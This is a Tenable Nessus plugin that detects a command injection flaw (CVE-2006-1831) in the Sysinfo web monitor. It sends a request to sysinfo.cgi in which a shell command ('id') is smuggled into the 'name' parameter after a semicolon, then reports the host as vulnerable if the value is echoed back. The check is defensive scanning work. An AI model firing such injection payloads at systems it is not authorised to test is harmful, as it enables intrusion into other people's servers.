#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21237);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2006-1831");
  script_bugtraq_id(17523);
  script_xref(name:"OSVDB", value:"24648");

  script_name(english:"Sysinfo name Parameter Arbitrary Code Execution");
  script_summary(english:"Tries to execute arbitrary code using Sysinfo");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Perl script that is susceptible to
arbitrary command execution attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Sysinfo, a web-based system monitor. 

The version of Sysinfo installed on the remote host fails to sanitize
user-supplied input to the 'name' parameter before passing it to a
shell for execution.  An unauthenticated attacker may be able to
exploit this issue to execute arbitrary shell commands on the remote
host subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/sysinfo_poc" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Sysinfo version 2.25 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/cgi-bin/sysinfo", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw.
  #
  # nb: this won't actually return any command output but cmd must
  #     be a valid command.
  cmd = "id";
  exploit = string(SCRIPT_NAME, ";", cmd);
  req = http_get(
    item:string(
      dir, "/sysinfo.cgi?",
      "action=systemdoc&",
      "name=", exploit
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if it looks like the name value was accepted.
  if (string("Dokumentation von ", exploit) >< res)
  {
    security_hole(port);
    exit(0);
  }
}
